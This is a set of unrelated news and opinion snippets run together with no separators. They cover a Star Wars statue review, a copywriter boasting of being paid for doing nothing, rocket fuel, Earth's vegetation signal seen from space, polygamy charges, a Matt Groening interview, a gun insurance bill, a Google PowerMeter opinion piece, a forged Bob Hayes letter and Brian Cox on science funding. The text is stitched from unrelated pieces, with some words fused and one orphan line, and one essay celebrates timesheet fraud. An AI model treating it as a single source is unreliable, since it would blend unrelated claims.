The softest material would be the clothing , and this is a very matte , lighter black .
The boots and gloves fall someplace in between .
This gives him some extra pop on the shelf , but there 's also a bit of color on the control buttons on his chest .
These are fairly clean , with very little slop .
Accessories - ***
This might be a statue , but it has accessories too !
As I mentioned , Kotobukiya supplied two extra arms .
One of these has a permanent hand ( left arm ) while the right arms shares the hand between them .
The arms and hands work great , and you can easily set the statue up in either pose .
The supplied blaster works well , and fits in the hands tightly .
There 's also a base , with a hunk of a beam or support attached .
It looks like something right out of the Death Star of course , and there 's even a loose droid you can place wherever you see fit .
The wheels on the bottom even turn !
Fun Factor - **
These are statues , not really toys .
A young Star Wars fan that likes collectibles would enjoy it , but it 's not really a sandbox sort of thing .
Value - **
Back in the day , you could often get Kotobukiya model kits in the $ 50 - $ 60 range with a little patience .
These days , it 's tough to find them for less than $ 80 , and that 's a pretty hefty price tag for what amounts to a plastic statue .
This price is what keeps me from picking up more , although I have to say that Zuckess and Bossk are looking awfully tempting .
Things To Watch Out For -
Take care with the sight on top of the blaster .
It an be broken off if you press to hard to the right or left - something you might tend to do while putting the gun in his hands .
Overall - ***
If you can pick these guys up at $ 60 or less , you could add another half star here .
They really do look terrific on the shelf , and I enjoy Koto 's non-human sculpts quite a bit .
The extra arms and accessories help a bit with that high price point , but these are n't something you 'll be able to buy without some thought .

The past few weeks , national headlines swirled with distressing news for an American workforce already cowering in fear .
As the world suffers the worst economic turmoil since the Great Depression , two - thirds of American CEOs plan to fire employees in the next year , Obama stimulus or no .
Something like 70,000 people lost their jobs on a single Monday two weeks ago .
I thought I was going to be one of them .
I should have been one of them .
But my job is safe and secure .
Not by virtue of my skill set or my indispensability to the Company ; no , my job security rests firmly on my employer ’s catastrophic ineptitude .
I ’m a copywriter working for an Internet subsidiary of R.H. Donnelley , better known as the Yellow Pages company .
They had stock worth $ 80 this time last year .
Weird , since their main product is a useless brick of cheap paper now mainly used for propping open doors and to beating toddlers without leaving any bruise marks .
But just a few weeks ago the stock finally made the drop to under a dollar .
As it turns out , the company ’s executives decided that it was the perfect time to renovate their offices .
We got our lay - off announcement about six months ago .
The subsidiary I work for handles pay - per- click campaigns ( like the ads on Google ) and other copywriting tasks for small businesses .
We were told our company was “ restructuring , ” meaning everyone would be fired .
People started to sweat .
There were panicked conversations in the breakroom .
Pay - per - click analysts vowed to go rogue and started contacting plumbers and day - spas , trying to sell them on the necessity of targeted Internet advertising .
Copywriters tried to cloud their impeding financial doom with daydreams about those $ 75 an hour New York gigs where they give you six months and a twenty - five - man team to come up with “ Just Do It ” and a swish .
But it seemed all that worry was for nothing .
Our lay - off deadline came and went .
And we still have our jobs .
Compassion was not a factor .
The execs had come up with a restructuring plan they needed us to carry out before cutting us loose on the breadlines .
It was like forcing someone to dig their own grave , and it would have been sadistic if it was n’t such a total failure .
On paper , our bosses wanted to have us “ fully automate ” the implementation of pay - per - click campaigns .
I laughed long and hard at that one during our lay - off announcement .
The task was literally impossible .
Conceived by stupid executives , it was as poorly thought through as the policies that sent the stock into the gutter .
But the ancient management types have very little knowledge of how anything in our office actually works .
They brainstorm independently of us , the people who actually know .
Their plans only work on paper , unlike my check , which can be converted to hard cash .
( That is , as long as the banks hold up . )
It ’s kinda funny to think of these assholes at work , all of them in their fifties with “ Just For Men ” highlights in their hair , sitting around a boardroom , watching a PowerPoint presentation that strategically stimulates the vague concepts that make up their costly expertise .
There ’s positive language all around .
Back slapping .
Optimism .
Smiles .
Underlings are well - advised to only sniff ass , never say anything smart .
Insight is just a threat to the hierarchy when the people on top are delusional — ask any apparatchik .
A break for a two - hour lunch is taken .
And that ’s when some long - term plan is finalized .
A huge figure with too many zeros to count is called out .
Papers are signed .
And everyone goes home happy .
Now I hear they ’re outsourcing the advertising copywriting — my job — to India .
I assume the 200 - word ads will soon look like those glaring , non-native English speaker Nigerian spam letters .
The irony , of course , is that it makes sense .
Our office is hilariously inefficient .
All you had to do was fire people who do nothing , and give the rest an incentive to do things .
But with the execs ’ misguided PowerPoint plan , I ’m glad to report the entire bloated and redundant workforce keeps getting its checks .
Now 85 % of the office , following my lead , “ works from home , ” doing maybe a half - hour of work per day .
This has been going on for months .
I wanted to sign my name to this article and forward it to my boss , so I could go out in a blaze of glory .
But I ’ve reconsidered .
I mean , why blow a sure thing ?
I could milk this job for months to come .
I ’ve been “ working from home ” — I mean , playing Fallout 3 — all last week .
I did no work at all .
NOTHING !
You ca n’t believe how good it feels to send in a timesheet and get paid $ 500 , with the knowledge that you wo n’t have to do a single lick of labor when next week rolls around .
There ’s like 40 or 50 people in the office doing the same thing .
It ’s better than working for the government !
Since everybody ’s getting fired , even management ’s doing it , brazenly .
And since the execs are mired in their own folly , everybody keeps getting paid .
While the bosses , dizzy with success , “ perfect ” the new system , I get to perfect my masturbation technique .
It ’s a regular welfare state .
It ’s sort of like the Soviet Union , but with better entertainment .
Thanks , execs !
WEST LAFAYETTE , Ind. , Jan. 27 ( UPI ) -- U.S. scientists say they are developing an improved type of gelled rocket fuel that is the consistency of orange marmalade .
Purdue University Professor Stephen Heister , who is leading one of two teams on the project , said gels are inherently safer than liquids because they do n't leak , and they also would allow the military to control rockets better than is possible with solid fuels now used .
Motors running on gelled fuels could be throttled up and down and controlled more precisely than conventional rockets that use solid propellants .
Advertisement
" You can turn the engine on and off , you can coast , go fast or slow , " he said .
" You have much greater control , which means more range for missiles .
The gelled propellants also tend to have a little more energy than the solid propellants . "
The five - year , $ 6.4 million project is funded by a U.S. Army Multidisciplinary University Research Initiative .
Another team is led by Pennsylvania State University .
Could analien astronomer have detected life on Earth during an ice age ?
Recent work hascalculated how past climate extremes affected the light reflected fromvegetation out into space .
The results could give hope to our own search forlife on distant worlds .
From faraway , our planet is a single faint speck of light in the sky .
Although we havesent radiomessages out to potential extraterrestrial listeners , none of these signalshave traveled more than a few tens of light years .
However , Earthlings have been broadcasting their presence to the galaxy for millions ofyears .
Terrestrial plants reflect strongly in the infrared , resulting in adistinctive feature ( called the vegetation red edge or VRE ) in the light bouncingoff the Earth 's surface .
" Weknow from earlier works that vegetation was detectable in the contemporaryspectrum , but was vegetation visible when the Earth was much colder thantoday ? " wonders Luc Arnold from the Observatory of Haute Provence inFrance .
Arnold andhis colleagues have taken climate models from a recent ice age , as well as arecent warm period , and used them to generate the reflection spectrum of the Earth in times past .
Their results , to be published in an upcoming issue of the International Journal of Astrobiology , show that the VRE has remained arelatively constantinterstellar beacon over the millennia .
Earthfrom afar
When the Apollo astronauts shone their cameras on Earth , we got a first glimpse of whatour planet lookslike from space .
But atfarther distances , continents and oceans blur together , and all that is left isa paleblue dot .
Several spacecraft - most recently the European Space Agency 'sVenus Express - have looked back at Earth from different points in the solarsystem .
Theseself - portraits are not merely a case of narcissism on the part of usEarthlings .
There is an important scientific question being posed :
How does a planet brimming with life appear from far away ?
The data fromspacecraft , as well as Earthshine collected from the moon , have shown thatthere are signatures of life in the spectrum of light reflecting from Earth .
Forexample , absorption lines from gases , like oxygen and methane , give some hintthat biology is at work .
Even more telling is a tiny notch in the spectrum at700 nanometers , where the reflection suddenly becomes stronger towards longerwavelengths .
This edge - occurring right at the boundary between visible light and the infrared - is dueto photosynthesizing plants .
They absorb the visible part of the spectrum , where mostof the energy is found in sunlight .
However , they reflect away the infrared - presumably to avoid overheating .
Pastclimates
Due tovegetation coverage , the Earth reflects 5 percent more infrared light than itwould if there were no plants .
Arnold and his colleagues were therefore curiousif this tiny VRE signal remained observable during one of Earth 's ice ages .
Theyfocused on the Last Glacial Maximum ( LGM ) , which occurred 21,000 years ago .
Average temperatures were around 4 degrees Celsius lower than now , and icesheets covered all of Canada and Northern Europe .
Forcomparison , they also examined a warm period 6,000 years ago , called the Holocene optimum ( HO ) , when temperatures were roughly a half a degree Celsiushigher than now , and plant life flourished in the Sahara .
" The [ LGM and HO ] are two extreme periods for which we have good knowledge of theclimate , " Arnold says .
Usingpaleoclimate models , the researchers determined the biome ( e.g. tundra , tropical forest , desert ) for every point on Earth during these two extremes .
Each biomereflects a different spectrum of light into space .
The European Space Agency 'sGOME ( Global Ozone Monitoring Experiment ) satellite has flown over all of thesebiomes and recorded the reflection .
Bycombining the biome map and satellite data with models for cloud cover and seaice , the team generated a globally - averaged spectrum for the Earth .
The resultsshowed that the VRE was a little smaller ( about 4 percent ) during the LGM , anda bit bigger ( 6 percent ) during the HO .
" Themain point is that even in climate extremes the vegetation remained visible , " Arnold says , and this is encouraging for future space missions aimed atdetecting and characterizing extrasolar planets similar to Earth .
ET takesroot
Astrobiologistshave long pondered whether life on other planets might be detectable throughspectral signatures .
The assumption has been that plant - likeorganisms on worlds that orbit a star similar to our sun will likely haveevolved a similar absorption - reflection strategy as our plants .
" If wecan detect a sharp feature that cannot be attributed to a mineral or acombination of minerals , it might be a sign of life , " Arnold says .
Arnold andcolleagues calculated that a VRE signal from an Earth - clone 30 light - years awaycould be detected , even if it were experiencing an LGM - type cold spell .
( However , a climate much colder than this - with ice caps extending down to China - might snuff out the signal , Arnold says . )
The VREdetection assumes a 6 - meter space telescope and 2 to 4 weeks of exposure time .
No such telescope currently exists , but the TerrestrialPlanet Finder - which is still in the design stage - might be in this sizerange .
" Ithink our paper shows that if continents on an Earth - like planet havevegetation , that should remain visible even during a colder than averageclimate , " Arnold says .
NASA says it has satellite data that shows more than 2 trillion tonnes of land ice in Greenland , the Arctic , Antarctica and Alaska has melted in the past five years .
Scientists say the melting land ice has raised global sea levels by about 5 millmetres .
They say sea levels are also rising as water expands from warming .
Scientists say parts of the Arctic were nine to 10 degrees Celsius warmer this spring .
They also say warming in the far north is accelerating faster than anywhere else on the globe .
Experts say the pace of change is starting to outstrip the human ability to keep up .
Scientists also point to large amounts of frozen methane that is being released .
Methane is another potent greenhouse gas which could dramatically increase global warming .
VANCOUVER – A civil liberties watchdog group is calling on the Crown to immediately drop polygamy charges against the leaders of a controversial B.C. religious sect .
Winston Blackmore and James Oler , leaders of the Fundamentalist Church of Jesus Christ of Latter Day Saints in Bountiful , B.C. , were charged last month with practising polygamy .
Blackmore , 52 , is accused of having 19 wives and 44 - year - old Oler , three .
But the B.C. Civil Liberties Association said Monday that the 1892 law that the two men have been charged under violates religious freedom .
" The Criminal Code provides adequate provisions for protecting vulnerable women and children without invoking section 293 , " the group said in a statement .
" We should not ... stand by quietly while the anti-polygamy law is used in a selective fashion to intrude on religious freedom and / or on responsible adults who make relationship choices that alarm or puzzle other Canadians . "
The association called the law barring multiple marriages ``archaic and over - vague , " and said the prosecutions were ``ill - advised . "
" The provisions are drafted very broadly .
Their original intent was to keep Mormons out of Canada , " association policy director Micheal Vonn said in an interview .
" They have the potential to be used again in a discriminatory fashion . "
The association said it has long been concerned about allegations of child abuse by the sect , a breakaway of the mainstream Mormon church which abandoned polygamy more than a century ago .
The group urged police to lay appropriate charges if there is any evidence of abuse .
Special prosecutor Terry Robertson did not return a call seeking comment .
Shortly after his arrest , Blackmore said the decision to charge him was religious persecution .
Blackmore said there are tens of thousands of polygamists from many different cultures living across the country but his religious sect , which openly practices multiple marriage , is being targeted .
He suggested his arrest was political grandstanding ahead of a May 12 provincial election .
The province was under increasing pressure after Warren Jeffs , the U.S. spiritual leader of the sect , was jailed in Utah as an accomplice to rape for his role in marrying a teenaged girl , and after authorities in Texas raided a sister sect to Bountiful in that state last fall .
The civil liberties group believes the case against the two men will fail .
" We look to the lessons of history like the Doukhobors and various other places where we 've gone in with a sledge hammer and had terrible results , " Vonn said .
" We have a way of going about this with relative precision and stability and we 've chosen to go a different route . "
The association is urging that the constitutionality of the anti-polygamy law be tested by a reference to the Supreme Court of Canada – a recommendation made in earlier legal opinions prepared for the B.C. attorney general .
Vonn said the section being used to prosecute Blackmore and Oler could be used to prosecute many Canadians .
" Before your official divorce papers come through , you move in with somebody else , " she said .
" You are probably a polygamist according to how broadly drafted those provisions are in the Criminal Code . "
Vonn said his group is hopeful its advice will be heeded .
" We 're making a rational argument , we 're saying why it is that we 're making this call and yes , of course , we 're hoping that we 'll be listened to . "
Creator of ‘ The Simpsons ’ looks to the 31st century , thinks Cartman would chop off Bart ’s head in a fight .
The irony that Matt Groening ’s first acclaimed comic strip was called “ Life in Hell ” could n’t be stronger , since his life over the past 20 years has clearly been anything but .
With his flagship success , “ The Simpsons , ” moving into its third decade , Groening has hardly been a one - project guy .
He still draws “ Life in Hell ” every week , and in 1999 he created “ Futurama , ” an animated series that takes place in the 31st century .
After runs on Fox , Cartoon Network and Comedy Central ( where it still airs ) , “ Futurama ” is now being produced as feature - length films that are both broken down for episodic broadcast , and released full - length on DVD .
The latest , “ Futurama : Into the Wild Green Yonder , ” comes out on DVD on Tuesday .
“ Family Guy ” creator Seth MacFarlane sings the opening song of the new “ Futurama ” movie .
but He ’s parodied “ The Simpsons ” on his show , and “ South Park ” has taken shots at “ Family Guy . ”
Is there a rivalry between you guys ?
Yes , of course .
There ’s some gentle spoofing of each other .
Although Fox has told both “ The Simpsons ” and “ Family Guy ” to knock it off .
You did n’t have “ Bonanza ” making “ Gunsmoke ” jokes .
Bart Simpson takes on Eric Cartman and Stewie in a prank fight .
Who wins ?
Actually , “ South Park ” did that .
I watched with great apprehension , and was just grateful they did n’t chop Bart ’s head off , because Cartman and his pals would blow Bart out of the water .
Bart ’s a gentle soul .
He ’s only 10 years old , so the consequences of his actions are not as bad as they ’ll be in a few years .
But we always thought there was a dark undercurrent to Bart ’s behavior in that as a teenager , his shenanigans would go from high jinks to felonies .
“ The Simpsons ” finally went HD last week and you made changes to the opening .
Is it better now ?
People say we finally changed the main title for the first time in 20 years , but the truth is the main title changed constantly .
We ’re always throwing in what we call Black Bart gags , where Bart is writing on the blackboard , and we switch little things around .
Lisa ’s saxophone solo switches .
The clouds at the very beginning of the main title were always unsatisfying to me .
My original direction to the animators was the make the clouds as realistic as possible , and as we go through the clouds we enter this cartoon universe of “ The Simpsons . ”
Finally , after a couple of decades , they ’ve gotten closer to what I had in my mind .
Not perfect , but better .
What ’s the weirdest fan tribute you ever got ?
People sometimes send me edible figurines , like cakes or cookies in the shapes of characters , and almost invariably they arrive smashed or moldy .
It ’s a mixed message when you open up the package and see a broken Homer Simpson cookie .
One time , [ we ] were sent cookies in the shape of dog biscuits placed in a dog biscuit box .
I brought them into the writers ’ room , and [ they ] ate ’em all .
There was a recent controversy about Nancy Cartwright [ the voice of Bart Simpson ] using Bart ’s voice to promote Scientology .
How did you feel about that ?
We all know the real God – the one true God – which is the Mighty Thor .
It was quite obvious that it got blown up beyond what was intended , and we ’ve moved on .
Now that you ’re successful , how do you base “ Life in Hell ” on your real life ?
First of all , deadlines are pretty hellish .
So I still face the weekly deadline I ’ve been [ facing ] for 29 years .
The other thing is , my life has changed for the better , and if you look in the upper right hand corner of the strip , I ’ve subtly changed the title of the comic from “ Life in Hell ” to “ Life is Swell . ”
That gives you a tip on how things are going .

Illinois — the land of Obama and the Blagojevich mafia — is serious about making the Second Amendment so expensive only the rich will be able to exercise it .
Kenneth Dunkin , a former social worker and Democrat member of the Illinois House of Representatives , has introduced HB0687 , entitled the “ Firearm Owners ID - Insurance ” bill .
It is currently in the Rules Committee .
A d v e r t i s e m e n t
Dunkin ’s bill amends the Firearm Owners Identification Card Act , a previous bill aimed at chipping away at the Second Amendment .
Dunkin ’s amendment states “ that any person who owns a firearm in this State shall maintain a policy of liability insurance in the amount of at least $ 1,000,000 specifically covering any damages resulting from negligent or willful acts involving the use of such firearm while it is owned by such person . ”
A million dollars !
Can you imagine the premium on such an insurance policy ?
It would be astronomical and out of the reach of most people in Illinois .
If the firearm owner cannot afford the insurance or decides that it is simply crazy and also unconstitutional and refuses to participate , “ the Department of State Police shall revoke and seize a Firearm Owner ’s Identification Card , ” thus making the the firearm illegal and the owner a criminal .
If Dunkin ’s bill makes it out of committee and is passed by the Illinois General Assembly , a whole lot of people will have their firearms confiscated by the State Police .

Mucin , a protein extracted from Nomura 's jellyfish , has proved highly effective in regrowing cartilage in joints , scientists in Japan claim .
The finding may provide a beneficial use of the jellyfish , also known as echizen kurage , which have been a damage - causing plague to the nation 's fisheries .
The curative effect of the protein nearly doubles when it is mixed with hyaluronic acid , a chemical usually used for the treatment of osteoarthritis , according to the results of experiments on rabbits undertaken at Tokai University and the Institute of Physical and Chemical Science .
The results of the research are scheduled to be officially reported at a meeting of the Japanese Society for Regenerative Medicine to be held in Tokyo in March .
Kiminori Ushida , head of the institute , and his team succeeded in extracting the protein from the jellyfish .
The research team eroded cartilage in the knee joints of rabbits to induce symptoms of osteoarthritis and later injected hyaluronic acid mixed with mucin into the worn joints .
When they examined the rabbits 10 weeks later , the worn - down cartilage had almost totally regrown .
The recovery rate was about 1.6 to 2.6 times higher than in rabbits that received shots of only hyaluronic acid , according to the team .

A J. D. Power and Associates survey of customer satisfaction with the car rental experience , released in November , found the average score declined for the second year in a row after gradually increasing since 2003 .
That survey was conducted before an industrywide round of layoff announcements in the last few months : 2,200 positions eliminated at the Avis Budget Group , 4,000 at Hertz , 400 at the Dollar Thrifty Automotive Group and 2,000 at Enterprise , a privately held company that also owns National and Alamo .
“ For Enterprise to lay off people is very , very exceptional , while the other companies have traditionally done it over the years , ” said Neil Abrams , president of the Abrams Consulting Group , which advises car rental companies .
Mr. Abrams said the industry had been responding to the most difficult downturn he had seen in 33 years .
He added , however , that it did have a flexibility that hotels and airlines lacked .
“ If you look at the two primary assets in this business , you ’ve got cars and you ’ve got people , ” he said .
“ The advantage in this industry is that both of those assets are highly scalable and elastic so you can downsize and upsize rather quickly . ”
Mr. Abrams estimated that demand for rental cars was down 10 to 15 percent from a year ago , while the industry had reduced the size of its fleet by more than 15 percent .
Yet he said companies still managed to raise rates .
In his weekly survey of midsize car rental rates at 10 major airports , the average rate in late January was $ 78.58 a day , compared with $ 59.76 a year ago .
Companies have also been responding to financial pressures by relying more on technology and by diversifying their business models .
Hertz , for example , has installed self - service check - in kiosks at 33 airports and now offers Web check - in .
Alamo has made similar changes .
Forget nature versus nurture , new research on twins hints at a crack in the conventional view that environment and genes combine to influence our traits .
“ Environment makes twins different – that ’s part of our traditional paradigm that is pretty well known , ” says Art Petronis , a geneticist at the University of Toronto , who led the new study .
“ Unfortunately , most of the attempts to identify what specific environmental factors make twins different failed . ”
Instead , inherited chemical adornments to DNA letters might play a substantial role in shaping individual differences between all people .
Petronis ’ team found that “ identical ” twins , who by definition share DNA , exhibit considerably different patterns of one kind of chemical modification across their genomes .
These modifications , known as methylations , can affect gene activation , as well as DNA replication and recombination .

Functional variations
Dubbed the epigenome , scientists have found increasing evidence that such changes underlie susceptibility to cancer , mental illness and , in mice , coat colour .
Researchers , including Petronis , have noticed individual genes and swathes of DNA that seem to differ between identical twins , but this is the first effort to look across the entire human genome .
Using DNA microarrays designed to measure methylation , Petronis ’ team compared the patterns in tissues belonging to 57 pairs of identical twins .
This method interrogated just 1 or 2 % of the total genome , but at sites peppered across the 22 non -sex chromosomes .
“ We detected that epigenetic differences are a universal phenomenon .
We see them in various locations across the entire genome , ” he says .
What ’s more , twins spawned from fertilised eggs that separated after just a few cell divisions differed more than twins who split days later .
This suggests that some epigenetic divergence occurs very early in embryo development , Petronis says .
Fraternal or non-identical twins share even fewer methylations than identical twins , Petronis ’ team found .
He theorises that these epigenetic variations are vestiges of methylation patterns initially present in sperm or egg cells .
Developmental differences
His team did not examine the result of these epigenetic changes , but other scientists have little doubt they contribute to traits such as disease susceptibility .
“ Some fraction of them I ’m sure will lead to functional differences , ” says Andrew Chess , a biologist at Harvard Medical School .
Randy Jirtle , a geneticist at Duke University Medical Center in Durham , North Carolina , thinks meeting twins in person offers ample proof of the epigenome at work .
“ Behaviourally they are a little different , but not so much in the way they look , ” he says .
The importance of epigenetic changes does n’t stop with twins .
Jirtle speculates that developmental differences between organisms lies principally in epigenetic modifications , not DNA sequences : “ If we had the same epigenome as a mouse , we ’d have a snout and a long tail . ”

THE US Drug Enforcement Administration dealt a major blow to science with its decision to preserve the National Institute on Drug Abuse 's monopoly on the supply of marijuana available for FDA - approved research ( " UMass loses marijuana lab bid , " Health / Science , Jan. 13 ) .
The decision is an inappropriate injection of political ideology into what should properly be a question of science .

Last but not least , Cyclopath worked only because of the attention and care of its user community -- that means you .
My promised restructuring of Microsoft will conclude tomorrow but today I want to cover a news announcement from Google that I think is very important , yet that importance seems to have been missed by the mainstream and technical press alike .
My subject is the Google PowerMeter , which is far more strategic than Google is letting - on .
Not that the official PowerMeter story is n’t a good one .
Google has invented these devices that will be distributed to users to measure the electricity consumption of their homes or apartments in real time , encouraging residents to conserve power , which is good for everyone .
I ’d love to have one of these gizmos , which in most cases wo n’t only report to the residents but also to the electric utility .
And eventually that utility may be able to directly control electric heating and cooling systems through the PowerMeters , turning them up or down as needed to reduce total demand during high - use periods , perhaps in exchange for lower electric rates for the consumer .
This power consumption shaping would be very similar to programs already in place with many industrial users , the idea being that if maximum consumption can be kept down below a certain level then the utility wo n’t have to fire - up expensive gas turbine generators that are often used for peak additional power .
And in extreme cases utilities might be able to forego entire power plants , saving in the case of nuclear plans , up to $ 3 billion in construction costs .
It ’s a heck of a deal .
So this is Google doing its bit for the environment in exchange for which they learn even more about our behavior , right ?
Wrong .
It ’s much more than that .
Google ’s PowerMeter is a Trojan horse – a way to become a de facto Internet Service Provider for potentially millions of homes .
Several years ago Google made a $ 100 million investment in a suburban Washington , DC company called Current Technologies , which is America ’s leading provider of both smart electric metering services ( that ’s what the Google PowerMeter is supposed to be ) AND power line Internet service based in part on the HomePlug networking standard .
Current ’s business model was simple .
They ’d give participating utilities a way to both measure and control local power consumption pretty much as described above .
Oh and , by the way , the meter connection could also be used to provide Internet service , potentially to 100 percent of a neighborhood since pretty much everyone buys electric power .
Throw Internet on the power bill , then maybe digital cable service , too .
Eventually the power companies would take on the cable and telephone companies to fight for broadband hegemony .
Only it is n’t really happening that way .
Current is doing deals with utilities , but most of those utilities AREN ’T going so far as to offer broadband Internet .
They are just reading meters , thank you , which is n’t bad unless your profit is supposed to come from the Internet and cable competitor side .
So Current Technologies is struggling somewhat and Google ’s investment in that company has n’t grown as much as either company would like .
Enter the Google PowerMeter , which is both an intelligent power meter AND an Internet gateway , just like the original vision at Current Technologies .
Electric utilities are enthusiastically installing backbone capability to serve these smart meters .
And contrary to popular belief , the network on the power company ’s side of that medium - voltage transformer on your telephone pole is usually optical fiber , NOT Broadband over Power Lines ( BPL ) which amateur radio operators hate so much .
The fact is that BPL has real distance limitations and it is just easier to string fiber alongside the medium and high - voltage lines .
So the utilities partner with Google to install these boxes , ideally in every home .
They install enough fiber for gigabit service to the medium voltage transformer with HomePlug or WiFi into the home .
And the whole thing interfaces to Google at the power company ’s data center where Google will install proxy servers and routers and connect to the Internet backbone .
Eventually Google — not the electric utility — throws the switch on consumer Internet access , IP TV , and VoIP phones , which the electric companies could have done – should have done – on their own but generally could n’t be bothered to .
Ideally Google lights the whole town with Internet with the utility happily picking - up most of the infrastructure costs yet with Google becoming the ISP .
Now THAT ’s a heck of a deal .
Prove to me I ’m wrong .
At a recent Hall of Fame news conference , a woman claiming to be Ex-Cowboys receiver Bob Hayes ' half sister read an emotional thank you letter written by him in 1999 .
But something is amiss .

Bob Hayes died in 2002 and this letter was supposedly a thank you pre-written in the the hope that he would someday enter into the Hall of Fame after three decades of disappointment .
Naturally , a reading at the conference by his half - sister Lucille Hester sparked a lot of emotion among the Cowboy 's organization , the fans and the NFL .
However , it appears that the letter is actually a forgery , and Lucille may be a Texas - sized fraud .
Hayes ' true relatives have long argued that Hester was nothing more than a friend during the last years of his life — and an examination of the letter has concluded that the signature is a blatant forgery and it was typed in Calibri — a font that did n't exist until Microsoft introduced it in Office 2007 .
If that was n't enough , his legendary teammate Roger Staubach 's name is misspelled in the document .

So , if these allegations are true , what is Hester 's motive ?
According to those involved she is an attention seeker that is using Hayes ' name to glorify herself .
At this point , the Hayes family is investigating their options .
Involving the law is a definite possibility , but in the immediate future they are trying to ensure that Hester does n't get any where near the stage during the induction ceremony on August 8th .

Republican Louisiana Sen . David Vitter made a trip to DC’s Chinatown on Thursday to nibble on kung pao chicken and rally the conservative troops .
Addressing the DC lawyers chapter of the conservative legal group , the Federalist Society , Vitter got right down to red meat .
After quoting comments from President Obama suggesting that he ’d like his judicial nominees to be able to empathize with the downtrodden , Vitter declared that demanding empathy in a judge was something you ’d expect in a “ dictatorship . ”
How empathy equates with repressive rule , Vitter did n’t really explain , except to say that it had little to do with ensuring checks and balances on an imperial government .
( Vitter also claimed–and it was hard to tell if he was joking or not –that he routinely walks from the Senate to the House of Representatives to use the apparently more populist House water fountains , instead of imbibing the stuff the Senate is drinking these days . )
But Vitter did n’t really come to Tony Cheng ’s to discuss judges or the Constitution .
His talk , entitled “ Defending Conservative Principles in the Senate , ” was mostly a complaint about the economic stimulus bill that his Senate colleagues were poised to pass without his vote or the votes of most Republicans .
According to Vitter , his party was having a come - to - Jesus moment over the stimulus package , which had provided the minority party an opportunity to rediscover its mantra of smaller government and lower taxes .
But it was hard not to wonder whether “ Diaper Dave ” is really the guy to be making the party ’s case for embracing conservative values .
You ’ll recall that back in 2007 , he admitted to calling the prostitute ring run by the infamous DC Madam , the late Deborah Jeanne Palfry .
( The ensuing media digging into his alleged patronage of a New Orleans brothel also produced reports suggesting the junior senator had a diaper fetish , hence the nickname . )
But the Federalists ( including several unemployed Bush administration officials networking for jobs ) did n’t seem to hold all that against him .
They cheered as Vitter hyped his votes against the confirmation of Hillary Clinton , Eric Holder , and Timothy Geithner , and his intention to continue to fight the all - but - done economic stimulus package .
More interesting , Vitter offered up a few specifics about the opposition party ’s political strategy given its diminished congressional power .
Vitter said defeating the stimulus bill was never the goal ; changing public opinion about it was .
“ We may have lost the vote , but we collectively have won the debate , ” he said , claiming that the public now perceived that the bill as evidence that the Obama administration was not bringing real change to Washington , but rather just engaging in the same old wasteful government spending .
( Congressional Democrats have been disseminating polls showing that the stimulus plan is backed by a majority of the public . )
“ We ’re getting back to our roots , ” Vitter said of congressional Republicans .
According to Vitter , the GOP is basically betting the farm that the stimulus package is going to fail , and the party wants Democrats to go down with it .
“ Our next goal is to make President Obama and liberal Democrats in Congress own it completely , ” he said .
Instead of coming up with serious measures to save the economy , the party intends to devote its time to an “ we told you so ” agenda that will include GOP - only hearings on the bill ’s impact in the coming months to highlight the bill ’s purportedly wasteful elements and shortcomings .
While Vitter seemed to think this was a brilliant new political tactic , voters might be less enthusiastic than Federalist Society members about politicians who spend the next 18 months rooting for the economy to get worse , just to prove a point .
But , in Vitter ’s world , that ’s the price you apparently have to pay for sticking to your principles , call girls be damned .
IS THERE A HIGGS ?
[ BRIAN COX : ]
There are two sets of questions I am asking myself .
One set for the scientific questions , the research that I do , but the other set , which is beginning to bother me more and more is why as a civilization we spend so little time and so little money and so little effort learning about the way the universe works .
For example , the average government investment in science in the Western world is about 0.4 percent of GDP .
It depends which way you look at it — I know in Britain the science budget about 3.5 billion pounds a year — so you can work that out .
It 's a pitifully small amount , and what 's begun to bother me is the question , is that optimal in any way ?
Has it been optimized ?
Has anyone even stopped to think what would happen if you doubled it or tripled it ?
And about a year ago that was a controversial thing to say because 3.5 billion pounds or 5 billion pounds — $ 10 billion — sounded like a lot of money .
Now it does n't sound like a lot of money at all .
It 's fractions of a percent of the bailout packages .
I know in the US that it seems that there 's going to be a large input , increase in science spending .
I want to know whether it 's optimized .
I strongly suspect it is n't .
I know when I ask people in the British government what would happen if you doubled the science spent , they do n't know .
They do n't know what the impact would be on GDP , on our quality of life , on the rate of discovery .
And with that actually goes an interesting question , which is , if you increase the amount of , let 's say taxpayers ' money into science , then what 's the responsibility of the sciences back to the taxpayers again ?
How should government direct scientific inquiry given that they spend taxpayers ' money on it ?
Should you follow government priorities ?
In Britain , and I 'm sure it 's the same as the US , it 's energy , security , climate change , aging population .
But when government directs scientific research , it 's my opinion , and this is not necessarily true , that it rarely works .
You look at paradigm shifts , the big scientific discoveries , and you can name them all , you have penicillin or the transistor or nuclear power or solar cells , anything you want , I struggle to find one that came from direct government scientific research .
They 're chance discoveries , and it 's not surprising to me .
It ’s actually obvious why that is .
Here 's the known and here 's the unknown .
The unknowns are here , the knowns there .
If you populate this border with lots of people who are free and allow them the freedom to just investigate , it seems obvious to me that they 're going to make more inroads into the unknown more quickly .
The more you constrain them and the less freedom you give them because you 're concerned about the funding and you 're trying to direct what they do into precise areas , then the less inroads you 're going to make .
What 's exercised in me is how do you convince government — because I 'm convinced it 's a good idea — to invest properly , not at 0.4 percent or 0.5 percent in GDP , but let 's say two percent in GDP , which is still pitifully small , in science without constraining the freedom of those scientists .
And that 's so you will get the next wave of paradigm shifts that will make the world better .
That exercises me .
Scientifically I work at the LHC in Geneva , the Large Hadron Collider , whose job it is to take the next step in what I think is the main road of physics , the main line of physics .
The LHC's job is to understand the forces of nature and to understand the building blocks of the universe , the smallest building blocks of matter .
In that respect you can draw a line from Newton , the first modern theory of the force of gravity , and you can go on to Maxwell , building on the work of Faraday , so with the forces of electricity and magnetism unified together you get the theory of electromagnetic waves .
You get the speed of light being a constant in that theory .
That leads to Einstein , E=MC squared .
You get the theory of the weak and the strong nuclear forces .
The LHC is the next experimental step on that road — we've been stuck for 30 - 40 years since a big new idea emerged on that road .
We 've been stuck at a particular point , which is the origin of mass in the universe .
This is what the Higgs Boson is supposed to fix .
But to many people it looks like classical physicists just looking for another particle , they spend $ 10 billion and we look for another particle .
It 's not that at all .
The question of mass in the universe is dictated by the place where we 've become stuck .
It ’s the door that is closed .
I can go into some depth and detail about why that is , but the point is that we know exactly where to look for the origin of mass .
We know what energy to look at and what energy of collisions we need .
If you want to think of it this way , we know how far to go back in time to the Big Bang to look .
Now , the LHC has plenty of energy to do that , so it will discover the origin of mass in the universe , but that 's not an end in itself .
